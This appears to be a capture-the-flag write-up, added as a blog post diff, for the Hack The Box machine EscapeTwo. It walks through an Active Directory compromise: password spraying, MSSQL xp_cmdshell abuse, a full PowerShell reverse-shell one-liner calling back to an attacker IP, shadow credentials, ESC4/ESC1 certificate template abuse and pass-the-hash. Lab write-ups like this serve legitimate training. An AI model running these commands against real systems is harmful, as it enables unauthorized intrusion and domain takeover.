@@ -1,0 +1,387 @@
+---
+title: HTB - EscapeTwo (Easy)
+date: '2025-07-12'
+tags: ['machine', 'windows', 'Active Directory', 'MSSQL', 'WriteOwner', 'ESC4', 'ESC1', 'shadow-credentials']
+draft: false
+summary: Initial Enumeration reveals an Excel file which discloses sensitive credentials that allow us to gain a foothold, then performing lateral movement to identify more credentials and gaining user access. Then, leveraging ACL misconfigurations to enumerate vulnerable cerificates which leads to ESC4. Thus, gaining DA 
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+> [!NOTE]
+> Given Credentials -> `rose:KxEPkKe6R8su`
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.129.245.75
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-12 11:55 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:55
+Completed NSE at 11:55, 0.00s elapsed
+Initiating NSE at 11:55
+Completed NSE at 11:55, 0.00s elapsed
+Initiating NSE at 11:55
+Completed NSE at 11:55, 0.00s elapsed
+Initiating Connect Scan at 11:55
+Scanning dc01.sequel.htb (10.129.245.75) [1000 ports]
+Discovered open port 53/tcp on 10.129.245.75
+Discovered open port 135/tcp on 10.129.245.75
+Discovered open port 445/tcp on 10.129.245.75
+Discovered open port 139/tcp on 10.129.245.75
+Discovered open port 3268/tcp on 10.129.245.75
+Discovered open port 1433/tcp on 10.129.245.75
+Discovered open port 593/tcp on 10.129.245.75
+Discovered open port 3269/tcp on 10.129.245.75
+Discovered open port 636/tcp on 10.129.245.75
+Completed Connect Scan at 11:55, 4.22s elapsed (1000 total ports)
+Initiating Service scan at 11:55
+Scanning 9 services on dc01.sequel.htb (10.129.245.75)
+Completed Service scan at 11:56, 52.03s elapsed (9 services on 1 host)
+NSE: Script scanning 10.129.245.75.
+Initiating NSE at 11:56
+Completed NSE at 11:57, 40.10s elapsed
+Initiating NSE at 11:57
+Completed NSE at 11:57, 7.12s elapsed
+Initiating NSE at 11:57
+Completed NSE at 11:57, 0.00s elapsed
+Nmap scan report for dc01.sequel.htb (10.129.245.75)
+Host is up (0.020s latency).
+Not shown: 991 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-12T03:57:12+00:00; -2s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-26T11:46:45
+| Not valid after:  2124-06-08T17:00:40
+| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
+|_SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2025-07-12T03:57:12+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.129.245.75:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ms-sql-ntlm-info: 
+|   10.129.245.75:1433: 
+|     Target_Name: SEQUEL
+|     NetBIOS_Domain_Name: SEQUEL
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: DC01.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-07-11T15:48:42
+| Not valid after:  2055-07-11T15:48:42
+| MD5:   80c3:d4a9:b721:b6f5:4294:38c4:3893:744a
+|_SHA-1: 8de6:5381:5d74:08e3:a1d2:a465:88e3:96da:2f12:5acb
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-12T03:57:12+00:00; -2s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-26T11:46:45
+| Not valid after:  2124-06-08T17:00:40
+| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
+|_SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-12T03:57:12+00:00; -2s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
+| Issuer: commonName=sequel-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-26T11:46:45
+| Not valid after:  2124-06-08T17:00:40
+| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
+|_SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-07-12T03:56:36
+|_  start_date: N/A
+|_clock-skew: mean: -1s, deviation: 1s, median: -2s
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:57
+Completed NSE at 11:57, 0.00s elapsed
+Initiating NSE at 11:57
+Completed NSE at 11:57, 0.00s elapsed
+Initiating NSE at 11:57
+Completed NSE at 11:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 104.00 seconds
+```
+
+Scanning shows the DNS is `sequel.htb` so let's put that in the `hosts` file. Other than that, scanning also reveals a running MSSQL Server on port `1433`.
+Let us now enumerate users and shares
+
+---
+
+## Enumerating
+
+```
+> nxc smb sequel.htb -u rose -p 'KxEPkKe6R8su' --users
+```
+
+![Description](/static/images/htb/windows/escapetwo/1.jpg)
+
+Put them in a file called `usernames.txt`, for the shares I couldn't enumerate them using `nxc`, I kept getting the NETBIOSTimeout errorso I used `smbclient`
+
+```
+❯ smbclient -L 10.129.245.75 -U rose%KxEPkKe6R8su
+```
+
+![Description](/static/images/htb/windows/escapetwo/2.jpg)
+
+I assumed all the shares were out of reach except the `Accounting Department` share
+
+```
+❯ smbclient "//10.129.245.75/Accounting Department" -U rose%KxEPkKe6R8su
+```
+
+![Description](/static/images/htb/windows/escapetwo/3.jpg)
+
+I downloaded the files and opened them up on an online xlsx viewer. One of the files reveals some juicy credentials
+
+![Description](/static/images/htb/windows/escapetwo/4.jpg)
+
+Since we already now what users are valid based on the enumeration earlier, we can cross-check the available,
+but it wouldn't hurt to just put them all in a wordlist. I put them in `passwords.txt`
+
+Then I sprayed all the combinations
+
+```
+❯ nxc smb sequel.htb -u usernames.txt -p passwords.txt --continue-on-success
+```
+
+We have a hit on `oscar:86LxLBMgEWaKUnBG`
+
+![Description](/static/images/htb/windows/escapetwo/5.jpg)
+
+Then I noticed the `sa` user with his odd password which maybe hinting he is a sysadmin at the MSSQL Server. I 
+also sprayed it using the `mssql` protocol
+
+```
+❯ nxc mssql sequel.htb -u usernames.txt -p passwords.txt --continue-on-success --local-auth
+```
+Spot On
+
+![Description](/static/images/htb/windows/escapetwo/6.jpg)
+
+---
+
+## Gaining Access
+
+Confirm current user is sysadmin
+
+```
+❯ nxc mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -M mssql_priv
+```
+
+![Description](/static/images/htb/windows/escapetwo/7.jpg)
+
+Now continue to execute Windows commands using `xp_cmdshell` option
+
+```
+❯ nxc mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -x 'whoami'
+```
+
+![Description](/static/images/htb/windows/escapetwo/8.jpg)
+
+I checked the `Desktop` folder there was no flag yet but I found the supposed user that we need to access
+
+![Description](/static/images/htb/windows/escapetwo/9.jpg)
+
+We need to find a way to get to `ryan` but before that I wanted to get on the machine first for a more interactive session
+
+```
+❯ impacket-mssqlclient sa@sequel.htb
+```
+
+As sysadmin, we can configure some settings to enable `xp_cmdshell` to execute commands so we can get a reverse shell
+
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+Now test for command execution
+
+```
+EXEC xp_cmdshell 'whoami';
+```
+
+![Description](/static/images/htb/windows/escapetwo/10.jpg)
+
+Now we start a listener and use this one liner Powershell command to get an interactive shell
+
+```
+EXEC xp_cmdshell 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.32'',1234);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
+```
+
+![Description](/static/images/htb/windows/escapetwo/11.jpg)
+
+---
+
+## Lateral Movement
+
+Nice, we are in. Browsing through, we can find a `SQL2019` folder, which has the configurations of the SQL Server
+
+![Description](/static/images/htb/windows/escapetwo/12.jpg)
+
+We can find a password in a file called `sql-Configuration.INI`
+
+![Description](/static/images/htb/windows/escapetwo/13.jpg)
+
+We can try to verify if it is `ryan`'s password
+
+![Description](/static/images/htb/windows/escapetwo/14.jpg)
+
+Valid! Now we can retrieve the user flag
+
+![Description](/static/images/htb/windows/escapetwo/15.jpg)
+
+---
+
+## Privilege Escalation
+
+Looking at Bloodhound, we find that `ryan` has `WriteOwner` ACE over `ca_svc` which is also apart of
+the `Cert Publishers` group which means we can probably test for ADCS vulnerabilities by performing
+Shadow Credential Attack that populates the `msDS-KeyCredentialLink` attribute on the targeted account
+
+![Description](/static/images/htb/windows/escapetwo/16.jpg)
+
+![Description](/static/images/htb/windows/escapetwo/17.jpg)
+
+But first we need to change the ownership of `ca_svc` to Ryan
+
+```
+❯ bloodyAD --host 10.129.245.75 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+```
+
+![Description](/static/images/htb/windows/escapetwo/18.jpg)
+
+Now we give `ryan` `GenericAll` ACE over `ca_svc` 
+
+```
+❯ bloodyAD --host 10.129.245.75 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan          
+```
+
+![Description](/static/images/htb/windows/escapetwo/19.jpg)
+
+Great, now we can Shadow Credentials Attack to get the NT hash of `ca_svc`
+
+```
+certipy shadow auto -u 'ryan@sequel.htb' -p WqSZAF6CysDQbGb3 -account 'ca_svc'
+```
+
+![Description](/static/images/htb/windows/escapetwo/20.jpg)
+
+Now we can enumerate for vulnerable Certificates using `ca_svc`'s credentials
+
+```
+certipy find -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -target 10.129.245.75 -stdout -vulnerable
+```
+
+![Description](/static/images/htb/windows/escapetwo/21.jpg)
+
+Observe it is vulnerable to ESC4, which according to this [article](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/),
+allows users with low privileges to modify the template and making it vulnerable to ESC1/ESC2/ESC3 and thus requesting an administrator certificate
+
+Based on the vulnerable template we have enumerated, we can find the name of it
+
+![Description](/static/images/htb/windows/escapetwo/22.jpg)
+
+Now let us modify the template
+
+```
+❯ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.245.75 -template DunderMifflinAuthentication -write-default-configuration
+```
+
+![Description](/static/images/htb/windows/escapetwo/23.jpg)
+
+Next enumerate once again to find the added vulnerabilities
+
+![Description](/static/images/htb/windows/escapetwo/24.jpg)
+
+Now, we see it is vulnerable to ESC1 of which we can exploit easily. Request the admin certificate with the vulnerable template
+
+```
+❯ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.245.75 -target DC01.sequel.htb -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
+```
+
+![Description](/static/images/htb/windows/escapetwo/25.jpg)
+
+Once we have obtained the .pfx certificate file, we can request the domain admin TGT Ticket or the administrator hash to gain access to the domain controller.
+
+```
+❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.245.75'
+```
+
+![Description](/static/images/htb/windows/escapetwo/26.jpg)
+
+Nice, now can WinRM inside `Administrator` and get the root flag
+
+```
+❯ evil-winrm -i 10.129.245.75 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+![Description](/static/images/htb/windows/escapetwo/27.jpg)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
